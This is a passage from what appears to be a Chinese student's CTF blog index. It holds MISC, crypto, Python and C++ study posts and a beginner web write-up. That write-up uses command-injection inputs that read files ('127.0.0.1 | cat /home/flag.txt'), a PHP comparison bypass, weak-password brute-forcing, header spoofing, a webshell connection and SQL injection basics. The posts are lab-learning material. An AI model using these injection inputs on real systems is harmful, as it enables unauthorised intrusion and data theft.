那些强悍的PHP一句话后门","categories":[{"name":"web","slug":"web","permalink":"http://bealright.github.io/categories/web/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://bealright.github.io/tags/CTF/"}]},{"title":"2019安恒七月月赛——MISC","slug":"2019安恒七月月赛——MISC","date":"2019-07-16T11:38:24.000Z","updated":"2019-07-19T10:35:10.755Z","comments":true,"path":"2019/07/16/2019安恒七月月赛——MISC/","link":"","permalink":"http://bealright.github.io/2019/07/16/2019安恒七月月赛——MISC/","excerpt":"","text":"前言：作为一个小白，感觉安恒的题是真的难，但也要努力复现出来，也可以多学很多东西。 真正的CTFer一张图片，还是之前的老思路，winehx查看，binwalk分离等等，但是都没有线索，再仔细观察图片，发现应该是高度被修改了，下面应该还隐藏有图片查看一下被修改过后的高度这里也不知道图片原高度为多少，就往大的方向整我这里直接将05改为了0C,结果过大了下方有空白，改成0A没有空白了，然后再观察图片，ctrl+左键放大图片得出flag，但这没有结束，大师傅告诉我这道题涉及png中CRC检验错误问题，让我拖进Stegsolve就知道有什么问题了，按照大师傅的说法去做，果然打不开百度查找，发现了一篇大佬的博客这也就是为何提示说png数据有问题的原因了，需要写一个爆破高度的脚本来得出原图的高度，才可以在Stegsolve中打开。这里搬运大师傅的脚本，目前自己写不出来，只会修改参数。 123456789101112131415# -*- coding: utf-8 -*-import binasciiimport struct#\\x49\\x48\\x44\\x52\\x00\\x00\\x01\\xF4\\x00\\x00\\x01\\xA4\\x08\\x06\\x00\\x00\\x00crc32key = 0x6F03AD71for i in range(0, 65535): height = struct.pack('&gt;i', i) #CRC: CBD6DF8A data = '\\x49\\x48\\x44\\x52\\x00\\x00\\x05\\x1C' + height + '\\x08\\x06\\x00\\x00\\x00' crc32result = binascii.crc32(data) &amp; 0xffffffff # print crc32result if crc32result == crc32key: print ''.join(map(lambda c: \"%02X\" % ord(c), height)) 因为我的环境是py3，而大师傅的脚本是py2，直接在线运行即可爆出了原图高度，进行修改,Stegsolve打开，即可看出flag 做题感悟：以前做修改宽高的MISC题中，没有想到过这种CRC检验错误的问题，这次做题是真的涨知识。另附上大佬的博客[CTF隐写]png中CRC检验错误的分析 解不开的秘密一个加密的word文档，一个十六进制的文件，先从文件入手，HEX-&gt;ASCII发现是base64，解密 这是啥。。。，完全没思路，不过还是注意到RealVNC,百度查查，REAL VNC是一款远程控制工具软件。观察到文件中有Password，如果猜的不错，这个密码破解后应该就是word的密码了。VNC密码破解详解果然找到了，思路清晰了，只要我们把这个给破解了就可以得出密码了因为上面博客中的工具实在找不到，就换一种新工具vncpwd找到对应目录，输入命令即可得出密码打开word回车的标志，把图片拖下去这里面肯定隐藏有flag，打开word的隐藏文字，但是不行，那就直接复制出来看看即可得出flag 做题感悟：这道题其实不难，但如果没有耐心就看到那个文件就不想继续下去了，果然是涉及各种各样的加密解密，这次又了解了VNC，通过做这两道题，收获很大，继续努力","categories":[{"name":"MISC","slug":"MISC","permalink":"http://bealright.github.io/categories/MISC/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://bealright.github.io/tags/CTF/"}]},{"title":"I春秋—— Crypto Write up(一)","slug":"I春秋—— Crypto Write up(一)","date":"2019-07-14T12:34:24.000Z","updated":"2019-07-19T16:20:38.143Z","comments":true,"path":"2019/07/14/I春秋—— Crypto Write up(一)/","link":"","permalink":"http://bealright.github.io/2019/07/14/I春秋—— Crypto Write up(一)/","excerpt":"","text":"前言：密码学涉及一系列的加密算法，虽然自己数学贼烂，但觉得加密这些算法还是蛮好玩的，就通过题来了解一些算法，话不多说，开始做题。 Substituted方法：百度翻译题目一下，Substituted（替换），替换加密中包含有简单替换密码，应该就是简单替换密码，在线网站求解一波。替换密码解密把头部改成iceCTF即可得出flag。 做题总结：通过这道题来了解一下简单替换密码 替换密码属于简单对称加密，即将字母表中一个字符替换成另一个字符，很好理解。1234567例如： 明文 ABDDD 替换规则： A-&gt;C B-&gt;T D-&gt;F 密文 CTFFF 而攻击方式也有很多种一、暴力破解二、字母频率分析因为替换密码只不过是从一个字符换成另一个字符，我们只要将出现在密文的所有字符出现的频率统计一下，看频率最高的。由此我们可以推断出，频率高的肯定是英文语言中最常用的一个字母的替换字母。密文中字母的频率分布与给定语言有着紧密的联系，即使在相对较短的密文中也成立。 参考大佬的博客进行学习关于替换密码详解 Alien Message一张外星语言图片方法：谷歌识图，查到对应的表，手动对照即可，但是flag格式有毒，大小写格式问题做题总结： 一开始拿到这个题，以为是图片会隐藏信息，用做杂项的方法尝试了但都没用，最后又学到了一招，百度识图或谷歌识图，有时也可以解决问题，也算了解了一种新的做题方法。 回旋13踢方法：根据题目和提供的格式推断出是ROT13(回旋13)，在线解密即可得出flag在线解密 做题总结：一开始真的是一脸懵，完全没有思路，只能查百度谷歌，查到了ROT13编码，所以就通过这个题来了解一下ROT13加密。 ROT13（回转13位）编码是凯撒加密的一种变体，只对字母进行编码（对数字、空格等无影响），用当前字母往前数的第13个字母替换当前字母即可例如：A-&gt;N,B-&gt;O,C-&gt;P等 除此之外，还有ROT5,ROT47 ROT5只对数字有效，用当前数字往前数的第5个数字替换当前数字即可。 ROT47：对数字、字母、常用符号进行编码，按照它们的ASCII值进行位置替换，用当前字符ASCII值往前数的第47位对应字符替换当前字符，例如：当前为小写字母z，编码后变成大写字母K，当前为数字0，编码后变成符号_ ，用于ROT47编码的字符其ASCII值范围是33－126。 接下来了解一下非对称加密和对称加密 ①：非对称加密，即加密和解密不是使用同一套规则，之前的对称加密解密中，使用的都是同一个密匙，如果在传输中被拦截，破解的几率会很高。②：非对称加密，加密和解密使用的不是同一个密匙，明文A通过公钥B加密，加密后的明文和公钥一起传输，接收方接收密文后用私钥C(只有接收者才有)解密，这样的加密解密的方式非常安全，即使公钥和密文在传输过程中被拦截了，拦截者没有私钥，就算拿着公钥和密文也无法破解出明文。因此相较于对称加密，非对称加密会更加安全。 RSA算法了解完对称加密和非对称加密后，就来学习一下RSA算法 在了解RSA算法之前，要先了解一下质数和互质数等数学概念，方便更好的理解RSA算法。 质数：一个大于1的自然数，除了1和它本身外，不能被其他自然数整除（除0以外）的数称之为质数(素数)。互质数：公约数只有1的两个数。判断互质数：①任意两个质数一定构成互质数②大数是质数的两个数一定是互质数（如97与88） 欧拉函数：任意给定正整数n，计算在小于等于n的正整数之中，有多少个与n构成互质关系？计算这个值的方法就叫做欧拉函数，以φ(n)表示.（计算互为质数的个数） 123例如：n为10，则与1、3、5、7、9互质，所以φ(n)=5注意这里10不是质数，只算与其互质的。 在RSA算法中，欧拉函数对以下定理成立 如果n可以分解成两个互质的整数之积，即n=p×q,则有φ(n)=φ(pq)=φ(p)φ(q); 根据“大数是质数的两个数一定是互质数”可以知道：一个数如果是质数，则小于它的所有正整数与它都是互质数；所以如果一个数p是质数，则有：φ(p)=p-1 φ(n)=(p-1)(q-1)123456789例如：定理二：n=33,q=3,p=11,n=p*qp、q均为质数，所以只要是小于自己本身的都是互质数，因此才有如下公式φ(p)=(p-1)//(-1)是为了去除本身，得出与其互质的个数φ(q)=(q-1)所以：φ(33)=（3-1）*（11-1）=30 除此之外，还需了解一下欧拉定理与模反元素概念清楚过后，就来梳理一下生成密钥对的流程 随机选择两个不相等的质数p和q，p与q越大则越安全选取p和q 计算p和q的乘积n 计算出n的值 计算n的欧拉函数值，即φ(n)=(p-1)(q-1)计算出φ(n)的值 随机选择一个整数e，条件是1&lt;e&lt;φ(n)，且e与φ(n)互质得出e的值 计算e对φ(n)的模反元素d计算出d的值 将(n,e)封装为公钥，(n,d)封装为私钥n的长度就是密钥长度 公钥 n：质数p和质数q的乘积，e：与φ(n)互质 私钥 n：同公钥n，d m为明文，c为密文参考大佬博客学习了一波，真的是学到知识了。黄映焜的博客园一文搞懂 RSA 算法RSA算法使用介绍RSA算法流程RSA练习 这次就先学习到这里，下次就开始练习RSA题目。","categories":[{"name":"Crypto","slug":"Crypto","permalink":"http://bealright.github.io/categories/Crypto/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://bealright.github.io/tags/CTF/"}]},{"title":"实验吧—(部分)MISC Write up","slug":"实验吧—(部分)MISC Write up","date":"2019-07-12T11:22:21.000Z","updated":"2019-07-12T14:58:59.673Z","comments":true,"path":"2019/07/12/实验吧—(部分)MISC Write up/","link":"","permalink":"http://bealright.github.io/2019/07/12/实验吧—(部分)MISC Write up/","excerpt":"","text":"前言: 杂项题包含密码学也有很大的脑洞，多练习也可以增强自己的脑洞，话不多说，做题吧。 欢迎来到地狱三个文件，从地狱伊始开做，打开后发现图片格式有问题，更改jpg文件头为FF D8即可修复好的图片给了一个链接，下载之后得到一个wav音频文件，听一下是摩斯密码，还是利用工具看看传递的是什么信息。根据形状，敲出摩斯密码长的为-，大点为.，小点为停顿/，即可得出 1-.-/./-.--/.-.././-/..-/.../--./--- 在线摩斯密码解密1K E Y L E T U S G O 打开第二次地狱需要密码，第一次地狱得出的应该就是密码key不是密码，只试后面的就可以了，最后得出小写的为密码1letusgo 打开文档后，一个哈士奇还有提示，图片隐写术这里尝试一些方法。。。都不行，没想到有在线图片隐写解密，还有这种操作。。。在线图片隐写密码即为you are in finally hell now那么第二层就解开了，下面来攻克第三层地狱第三层一个txt一个jpg都是加密的，密码应该就是我们刚才从图片中解出的密码提示是二进制，转化为16进制再转文本，解出来12ruokouling//弱口令 我们再来看加密的图片，用winhex进行分析发现末尾藏有txt文件，binwalk无法分离，用foremost进行分离（也可直接把后缀名改为zip）我们刚才从提示中得到的是弱口令，所以这个加密txt估计要用弱口令字典进行爆破，加载字典，进行爆破（这里得多准备一些字典，有的字典没有这个密码，一开始被困在这很久）得出密码我天，还有。。。来吧，这里按照他们加密小姐姐的顺序反过来解密即可。首先是base64解密，得出1U2FsdGVkX19pDorZ2hTP+5w0zSA9bXhVezJy2umFTSp6PdN6zPKCMA== 中途经历兔子洞穴一开始懵了，查兔子加密。。。，换成英文Rabbit，就比较好查了，很多在线网站凯撒家族凯撒解密第10次解密，即可解出flag，加上提示的格式即可。 九连环一张图片，用winhex观察，发现隐藏有zip，binwalk分离出来。分离出一张图片和一个加密的txt,密码应该是从图片中得出的。这里对图片进行各种操作。。。 结果都不行，实在没思路了看了一下大佬的博客，发现要用到一个隐写工具steghide输入命令，提取出一个ko.txt用密码打开加密的txt即可得出flag FIVE1用winhex观察，发现有zip，binwalk分离，一个加密的图片暴力破解打开图片用winhex观察base64解码摩斯密码解密好用的摩斯解密网站这里被困住了，因为不知道MD5的特征，所以一开始也不知道这是MD5加密后的结果,先来了解一下MD5 MD5是从一段字符串中通过相应特征生成一段32位的数字字母混合码。而且是不可逆，相同数据的MD5值肯定一样，不同数据的MD5值不一样。 MD5解密网站即可得出flag","categories":[{"name":"MISC","slug":"MISC","permalink":"http://bealright.github.io/categories/MISC/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://bealright.github.io/tags/CTF/"}]},{"title":"python学习（字符串、整数、列表）","slug":"python学习（字符串、整数、列表）","date":"2019-07-11T11:22:21.000Z","updated":"2019-07-12T13:45:52.598Z","comments":true,"path":"2019/07/11/python学习（字符串、整数、列表）/","link":"","permalink":"http://bealright.github.io/2019/07/11/python学习（字符串、整数、列表）/","excerpt":"","text":"前言：python语言简洁，而且写web题脚本方便，暑假闲着也无聊，不如学习一些知识。 一、字符串修改字符串的大小写python中定义字符串用双引号或单引号都可以python需要提前定义变量，这点和C语言一样，而且python中有方法，方法中包含一些功能，这里我觉得和C++中的成员函数比较相似，就连调用方法也相同，只不过python已经写好了这些功能，我们直接调用即可。 title()方法将字符串首字母大写upper()方法将字符串全变成大写lower()方法_将字符串全变成小写 合并字符串 + 起连接作用 python中合并字符串也很方便，直接一个+号就可以连接前后的字符串。也可以这样表示：总之，python的语法是真的简洁，不需要像C语言一般还需要调用函数来完成合并字符串。 使用制表符和换行符 \\t 制表符\\n 换行符123print(\"\\tpython\")输出结果： python 12345print(\"ss\\ntt\\nll\\n\")输出结果：ssttll 删除空白 rstrip()方法删除字符串末尾的空白123456789&gt;&gt;&gt; language='python '&gt;&gt;&gt; language'python '&gt;&gt;&gt; language.rstrip()'python'&gt;&gt;&gt; language'python '&gt;&gt;&gt; //这样的删除方法删除空白只是暂时的 12345//永久删除空白，必须将删除操作的结果存回到变量中&gt;&gt;&gt; language = 'python '&gt;&gt;&gt; language = language.rstrip()&gt;&gt;&gt; language'python' lstrip()方法删除字符串开头的空白strip()方法同时删除开头和末尾空白 12345&gt;&gt;&gt; language=' python '&gt;&gt;&gt; language.lstrip()'python '&gt;&gt;&gt; language.strip()'python' 二、数字整数 **两个乘号在python表示乘方运算1234&gt;&gt;&gt; 3 ** 29&gt;&gt;&gt; 3 ** 327 python支持次序运算1234&gt;&gt;&gt; 2+3*414&gt;&gt;&gt; (5+1)*318 浮点数 str()函数用来避免类型错误 12345age=23message=\"happy \"+ str(age) +\"rd birthday!\"print(message)//输出结果：happy 23rd birthday! 如果不加str()函数，则会出错，原因是python不知道该如何解读这个值。 注释 在python中用#来注释 1234# 学习pythonprint(\"hello python people!\")//输出结果：hello python people! 在python终端会话中执行命令import this，浏览一下python的指导原则 三、列表 在Python中，用方括号（[] ）来表示列表，并用逗号来分隔其中的元素。 列表与C中的数组较为相似，所以比较好理解。 修改列表元素 在列表添加元素 append（）方法将元素添加到列表末尾 1234567message=['ha','ya','ss']print(message)message.append('wangzixu')print(message)#输出结果：['ha', 'ya', 'ss']['ha', 'ya', 'ss', 'wangzixu'] 在空列表中直接插入元素1234567message=[]message.append('a')message.append('b')message.append('c')print(message)#输入结果：['a', 'b', 'c'] 在列表中插入元素 insert() 方法可在列表的任何位置添加新元素 12345message = ['a','b','c']message.insert(0,'me')print(message)#输出结果:['me', 'a', 'b', 'c'] 从列表中删除元素 使用del语句进行删除1234567message=['a','b','c']print(message)del message[0]print(message)#输入结果：['a', 'b', 'c']['b', 'c'] 使用pop()方法删除列表末尾元素12345678910message= ['a','b','c','d']print(message)pop_message=message.pop()print(message)print(pop_message)#输出结果：['a', 'b', 'c', 'd']['a', 'b', 'c']d#删除的结果会储存到变量pop_message中 12345678910#使用方法pop（）也可以删除指定位置的元素message= ['a','b','c','d']print(message)pop_message=message.pop(1)print(message)print(pop_message)#输出结果：['a', 'b', 'c', 'd']['a', 'c', 'd']b 要从列表中删除一个元素，且不再以任何方式使用它，就使用del 语句；如果要在删除元 素后还能继续使用它，就使用方法pop() 。 根据值删除元素 只知道元素值的话，可以用remove（）删除元素1234567message= ['a','b','c','d']print(message)message.remove('c')print(message)#输出结果：['a', 'b', 'c', 'd']['a', 'b', 'd'] 组织列表 方法sort()能够对列表进行排序，按照字母顺序排序，并且是永久性修改12345message=['k','n','d','a']message.sort()print(message)#输出结果：['a', 'd', 'k', 'n'] 也可以按照字母反序进行排序，只需要在sort（）中加入参数reverse=True12345message=['a','g','d','m']message.sort(reverse=True)print(message)#输出结果：['m', 'g', 'd', 'a'] 函数sorted()对列表进行临时排序，函数sorted() 能够按特定顺序显示列表元素，同时不影响它们在列表中的原始排 列顺序。 12345678message=['k','c','a','d']print(message)print(sorted(message))print(message)#输出结果：['k', 'c', 'a', 'd']['a', 'c', 'd', 'k']['k', 'c', 'a', 'd'] 倒着打印列表 使用方法reverse()反转列表元素的排列顺序,也是永久修改，如果要恢复原来的排列顺序，只需再次调用即可12345678910message=['k','c','a','d']print(message)message.reverse()print(message)message.reverse()print(message)#输出结果：['k', 'c', 'a', 'd']['d', 'a', 'c', 'k']['k', 'c', 'a', 'd'] 确实列表的长度 使用函数len()可获悉列表长度123&gt;&gt;&gt; message = ['a','c','d','d','f']&gt;&gt;&gt; len(message)&gt;5 这次先学习到这里，未完待续。。。。。。","categories":[{"name":"编程语言学习","slug":"编程语言学习","permalink":"http://bealright.github.io/categories/编程语言学习/"}],"tags":[{"name":"python","slug":"python","permalink":"http://bealright.github.io/tags/python/"}]},{"title":"XCTF(攻防世界)—新手web题Write Up","slug":"XCTF(攻防世界)—新手web题Write Up","date":"2019-07-10T12:34:24.000Z","updated":"2019-07-24T00:39:40.274Z","comments":true,"path":"2019/07/10/XCTF(攻防世界)—新手web题Write Up/","link":"","permalink":"http://bealright.github.io/2019/07/10/XCTF(攻防世界)—新手web题Write Up/","excerpt":"","text":"前言：之前一直没有接触过web这方面的题，这次利用暑假时光好好学习，web真的是很有趣，虽然有的题很简单，但可以学习到很多知识，话不多说，做题。 view_source用老版火狐浏览器，直接查看源码即可。 get_post利用火狐进行传参，即可得出flag。 robots 做这道题之前，了解一下robots协议，爬虫协议，robots.txt是搜索引擎中访问网站的时候要查看的第一个文件，如果有这个文件，robots.txt文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。 了解robots协议后，做题就好做了，直接访问robots.txt文件。给了一个PHP文件名，访问一下即可得出flag backup不知道，百度百科一下那加上后缀名即http://111.198.29.45:47771/index.php.bak再访问一下，即可得出flag。 cookie用burp抓一下包看看添加后缀名 查看HTTP响应，即可得出flag disabled_button根据提示，将disabled删除即可点出flag webshell一句话，用菜刀进行连接连接成功，即可得出flag simple_php 123456789101112131415 &lt;?phpshow_source(__FILE__);include(\"config.php\");$a=@$_GET['a'];$b=@$_GET['b'];if($a==0 and $a)&#123; echo $flag1;&#125;if(is_numeric($b))&#123; exit();&#125;if($b&gt;1234)&#123; echo $flag2;&#125;?&gt; is_numeric() 函数用于检测变量是否为数字或数字字符串。 代码很好理解，传入对应的参数即可得出flag1http://111.198.29.45:52319/?a=a 即可得出1http://111.198.29.45:52319/?b=1236b 即可得出拼接一下，即可得出flag command_execution（命令执行）做题之前，要先了解一下ping功能，waf等。ping命令的使用方法及功能 WAF主要防护的是来自对网站源站的动态数据攻击，可防护的攻击类型包括SQL注入、XSS攻击、CSRF攻击、恶意爬虫、扫描器、远程文件包含等攻击,相当于防火墙。 命令执行详解 常见的命令执行 command1 &amp; command2 ：先执行command2后执行command1command1 &amp;&amp; command2 ：先执行command1后执行command2command1 | command2 ：只执行command2command1 || command2 ：command1执行失败，再执行command2(若command1执行成功，就不再执行command2) 除此之外，我们还要了解一些常用的Linux命令。常用 Linux 命令 了解之后，我们便开始做题。首先ping一下本地即127.0.0.1ping通本地后，发现传输三个数据包，接下来就用到我们学到的Linux基本命令查看一下，三个数据包中是否有flag.txt输入命令127.0.0.1 &amp; find / -name flag.txt果然有，再输入命令127.0.0.1 | cat /home/flag.txt查看flag.txt文件，即可得出flag。这里得了解一下cat命令，用来查看文件内容 weak_auth（ 弱身份验证 ）试试最常用的admin 123456组合，竟然爆出了flag，真的是弱口令，不过查了其他方法，用爆破的方法也可以做出了，这里记录一下爆破过程。 先在GitHub上下载弱口令字典，用burpsuite进行爆破用admin作为账号，试试登陆看来账号就是admin，那么就只爆破密码就可以了密码随便输入一个，抓一下包将密码设置为变量载入字典发现到123456时，长度不同，所以密码即为123456，登陆一下即可得出flag xff_referer在此之前，我们需要了解下 xff——伪造IP地址来源格式为：X-Forwarded-For: client1, proxy1, proxy2, proxy3referer——伪造来源浏览器 伪造XFF头绕过服务器IP过滤了解之后，便能够做题了抓包，根据提示修改xff此时页面显示必须来自https://www.google.com根据提示，伪造来源服务器，即可得出flag simple_js打开之后，直接查看源代码，发现一串JS代码 1234567891011121314151617181920function dechiffre(pass_enc)&#123; var pass = \"70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65\"; var tab = pass_enc.split(','); var tab2 = pass.split(',');var i,j,k,l=0,m,n,o,p = \"\";i = 0;j = tab.length; k = j + (l) + (n=0); n = tab2.length; for(i = (o=0); i &lt; (k = j = n); i++ )&#123;o = tab[i-l];p += String.fromCharCode((o = tab2[i])); if(i == 5)break;&#125; for(i = (o=0); i &lt; (k = j = n); i++ )&#123; o = tab[i-l]; if(i &gt; 5 &amp;&amp; i &lt; k-1) p += String.fromCharCode((o = tab2[i])); &#125; p += String.fromCharCode(tab2[17]); pass = p;return pass; &#125; String[\"fromCharCode\"](dechiffre(\"\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30\")); h = window.prompt('Enter password'); alert( dechiffre(h) ); 要做这道题就得看懂JS代码表达的意思，首先来了解代码中出现的一些方法 split() 方法用于把一个字符串分割成字符串数组。fromCharCode() 可接受一个指定的 Unicode 值，然后返回一个字符串。prompt()方法用于显示可提示用户进行输入的对话框。 了解之后，便可以观察代码了这一部分代码分为两个循环，但是仔细观察的话，第一个循环是将前五个Unicode 值，然后返回一个字符串，写一个简单的python脚本验证下后一个循环功能是一样的，只不过是把后面的Unicode 值，返回成字符串。返回的pass为即不管我们输入什么，最终显示都是这个，所以这个是假的密码，那么真正的密码应该就是十六进制转化为文本字符再用简单的python脚本跑一下，即可得出flag 题虽然不是太难，但是可以学习到很多知识，接下来得快点学习python以写脚本用，方便做题。","categories":[{"name":"web","slug":"web","permalink":"http://bealright.github.io/categories/web/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://bealright.github.io/tags/CTF/"}]},{"title":"C++学习总结（函数、类与对象）","slug":"C++学习总结（函数、类与对象）","date":"2019-06-19T09:13:24.000Z","updated":"2019-06-19T09:17:05.395Z","comments":true,"path":"2019/06/19/C++学习总结（函数、类与对象）/","link":"","permalink":"http://bealright.github.io/2019/06/19/C++学习总结（函数、类与对象）/","excerpt":"","text":"前言：时间过的好快，转眼一学期就过去了，期末考试也快到了，所以就复习一遍同时也将自己学习的感悟总结下来。前面几章大多与C语言相似，就不总结了。 第三章——函数参数传递123456789101112131415161718192021#include &lt;iostream&gt;using namespace std;void swap(int a,int b) &#123; int t=a; b=t; a=b;&#125;int main()&#123; int x=5,y=10; cout&lt;&lt;\"x= \"&lt;&lt;x&lt;&lt;\" y= \"&lt;&lt;y&lt;&lt;endl; swap(x,y); cout&lt;&lt;\"x= \"&lt;&lt;x&lt;&lt;\" y= \"&lt;&lt;y&lt;&lt;endl; return 0;&#125;//输出结果x= 5 y= 10x= 5 y= 10 通过这个例子，可以看出形参值的改变对实参是无影响的，如果是引用传递的话就另当别论了，看下面这个例子。可以看出，如果使用引用参数的话是可以改变实参的值，但要注意： 声明一个引用时，必须同时对它进行初始化，使它指向一个已经存在的对象 一旦一个引用被初始化后，就不能改为指向其他对象 内敛函数对于内敛函数，我的理解是就相当于一个类中公有类型的成员函数，只不过是放在了类外面，需要在函数返回值类型前加上inline,而且内敛函数大多都是调用频率很高，而且代码是相对简单的。 带默认形参值的函数通过这个代码就会理解带默认形参值的函数，但也有几点要注意： 有默认值的形参必须在形参列表的最后，因为实参与形参是按照从左到右的顺序建立关系的。 在相同的作用域中，不允许在同一个函数的多个声明中对一个参数的默认值重复定义。 函数重载说白了，就是同一个函数名，但又不同的功能，这就叫函数重载，也需注意： 函数重载不以形参名来区分函数 函数重载不以返回值来区分函数 第四章——类与对象 类的定义：class 类名称{ public： 外部接口private：私有成员}；对象声明:类名 对象名;对象访问数据成员:对象名.数据成员名对象调用函数成员:对象名.函数成员名（参数表）成员函数的实现: 返回值类型 类名::函数成员名（参数表） { 函数体 } 例如：123456789void Clock::setTime(int newH,int newM,int newS) &#123; hour=newH; minute=newM; second=newS;&#125;void Clock::showTime() &#123; cout&lt;&lt;huor&lt;&lt;\":\"&lt;&lt;minute&lt;&lt;\":\"&lt;&lt;seconde&lt;&lt;endl;&#125; 到这才算刚接触到C++，这些便是C++访问成员函数或对象的一些方法。 构造函数通过这个代码，感觉构造函数有一般成员函数的特征，但构造函数有一些特殊的特征：构造函数的函数名与类名相同，而且没有返回值 复制构造函数 复制构造函数的一般方法class 类名{ public: 类名（形参名）；//构造函数 类名（类名 &amp;对象名）；//复制构造函数…};类名：：类名（类名 &amp;对象名）；//复制构造函数的实现{函数体} 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;iostream&gt;using namespace std;class point &#123;public: point(int xx=0,int yy=0) &#123; x=xx; y=yy; &#125; point(point &amp;p); int getX() &#123;return x;&#125; int getY() &#123;return y;&#125;private: int x,y;&#125;;//成员函数实现point::point(point &amp;p) &#123; x=p.x; y=p.y; cout&lt;&lt;\"copy\"&lt;&lt;endl;&#125;//形参为point类对象的函数void fun1(point p) &#123; cout&lt;&lt;p.getX()&lt;&lt;endl;&#125;//返回值为point类对象的函数point fun2()&#123; point a(1,2); return a;&#125;int main()&#123; point a(4,5); point b=a;//情况一，用a初始化b.第一次调用复制构造函数 cout&lt;&lt;b.getX()&lt;&lt;endl; fun1(b);//情况二，对象b作为fun1的实参。第二次调用复制构造函数 b=fun2();//情况三，函数返回值是类对象，函数返回时，调用复制构造函数 cout&lt;&lt;b.getX()&lt;&lt;endl; return 0;&#125; 通过这个代码来了解一下复制构造函数，复制构造函数拥有一般构造函数的所有特性，而它所不同的是形参是本类的对象的引用。作用是使用一个已经存在的对象（由复制构造函数的参数指定），去初始化同类的一个新对象。这个概念理解起来最好是通过代码，这样便于理解。 复制函数有三种情况可以被调用： 当用类的一个对象去初始化该类的另一个对象时。 如果函数的形参是类的对象，调用函数时，进行形参和实参的结合时。 如果函数的返回值是类的对象，函数执行完成返回调用者时。 析构函数构造对象时，构造函数中分配了资源，动态申请了一些内存单元，在对象消失时需要释放这些内存单元。而析构函数就用来完成对象被删除前的一些清理工作。析构函数是在对象的生产期即将结束的时刻被自动调用的。而且析构函数不接收任何参数。","categories":[{"name":"编程语言学习","slug":"编程语言学习","permalink":"http://bealright.github.io/categories/编程语言学习/"}],"tags":[{"name":"C++","slug":"C","permalink":"http://bealright.github.io/tags/C/"}]},{"title":"Bugku—MISC题总结","slug":"Bugku—MISC题总结","date":"2019-06-15T11:38:24.000Z","updated":"2019-07-19T10:34:28.875Z","comments":true,"path":"2019/06/15/Bugku—MISC题总结/","link":"","permalink":"http://bealright.github.io/2019/06/15/Bugku—MISC题总结/","excerpt":"","text":"前言：MISC考脑洞，也考分析和观察能力，总之比较有趣，就总结一下我的做题过程。 这是一张单纯的图片用winhex打开 Unicode编码转换ASCII即可得出flag 隐写前四位是宽度，后四位是高度。将A4修改位F4即可得出flag telnetwinhex打开就可得出flag 眼见非实(ISCCCTF)下载之后打不开，根据提示眼见非实，将docx文件改成zip文件即可得出flag 啊哒用winhex打开，发现隐藏有zip文件，用binwalk进行分离得到一个加密文本，开始以为是伪加密，但用winhex打开后查看不是伪加密，因为不知道是否含字符、或是几位数，所以暴力破解也是不可取的，回去查看第一张照片，应该还隐藏有信息。果然藏有东西，base16解码即可得出密码sdnisc_2018，打开文本即可得出flag 又一张图片，还单纯吗第一反应便是winhex打开，结果也没有发现什么，用binwalk分离也分离不出来，但确实能看出里面隐藏有文件。这里就需要一个新的工具foremost-master分离工具。输入命令，提取出文件，即可得出flag 123$ foremost -T 2.jpgProcessing: 2.jpg|*| 猜百度识图，直接可以识别是谁，至于flag提示中有 隐写2winhex查看binwalk进行分离分离出一个加密的图片，和一个提示，既然都告诉我们了密码是3个数，直接暴力破解密码为871，即可得出flag 宽带信息泄露一开始各种方法都试过，实在没思路，回去看题目，宽带信息泄露，用文本打开是乱码，说明被加密了，这里就需要一个工具RouterPassView来帮助做题了又提示flag{宽带用户名}，打开工具直接查找username，即可得出flag。 多种方法解决用winhex打开后，发现是base64转图片的格式，在线转图片，即可得出flag 闪的好快得出一个gif二维码，用神器Stegsolve即可得出18张二维码图片，扫码即可得出flag 白哥的鸽子一开始用winhex打开，没有注意到末尾，尝试了其他方法不行才发现末尾的重要信息。这里可以看到flag只是顺序被打乱了，栅栏加密，解密即可得出flagflag需去除两个@ 隐写3这道题要敏感，大白怎么可能光一个头，所以应该是改图片的宽高，即可得出flag这样才可爱 爆照(08067CTF)下载图片，用winhex打开后发现隐藏有zip文件，binwalk进行分离。给了一堆文件，把后缀名改为jpg,看看能显示出什么发现其中一个有二维码，扫出bilibili再看题目提示答案格式我们应该还漏掉有其他答案，再回去查看图片888.jpg发现base64，解密得出silisili应该还有一个在8888.jpg中发现隐藏有图片，binwalk一下即可得出panama按照题目提示拼接成falg即可 神秘的文件flag压缩包中还有一个logo图片明文攻击，把外面的logo图片也压缩进flag压缩包中接下来爆破口令打开word既然找不到flag，把你变成zip格式看看是否隐藏有找到了base64解密即可得出flag 细心的大象细心的大象，要细心，看看照片详细信息隐藏有东西没果然，这个又是base64加密的接下来，把照片binwalk一下，出来一个压缩包，里面一个加密的图片上面base64解密后的密码就是这个照片的密码跟一开始遇到那道题一样，修改宽高即可得出flag 图穷匕见之前做过这种题，打开winhex后发现一堆十六进制，在notepad++打开后转成ascll，再替换成相应的格式即可画图。具体做法这里就不细说了，之前总结的也做过这个题。 这次就先总结到这里，另一部分的题写到下一篇博客中。","categories":[{"name":"MISC","slug":"MISC","permalink":"http://bealright.github.io/categories/MISC/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://bealright.github.io/tags/CTF/"}]},{"title":"通过sql-labs进行sql注入学习(一)","slug":"通过sql-labs进行sql注入学习(一)","date":"2019-06-09T12:01:24.000Z","updated":"2019-06-09T13:01:04.019Z","comments":true,"path":"2019/06/09/通过sql-labs进行sql注入学习(一)/","link":"","permalink":"http://bealright.github.io/2019/06/09/通过sql-labs进行sql注入学习(一)/","excerpt":"","text":"SQL注入有很多方法，先接触最简单最直观的一种——联合查询注入 联合查询注入原理联合查询的前提是需要有显示位，而显示位就是通过用户的查询从数据库中返回到页面的数据，是可变化的。 例如：sql-labs前四关都是联合查询注入 sql-labs(一) 输入id=1或id=2，都会返回数据，而且返回的数据不相同。 接下来就开始实战，通过实战来了解联合查询注入的步骤和方法。 一、判断注入点 闭合符号一般是&#39;,&quot;,或无闭合符号或&#39;)，&quot;) 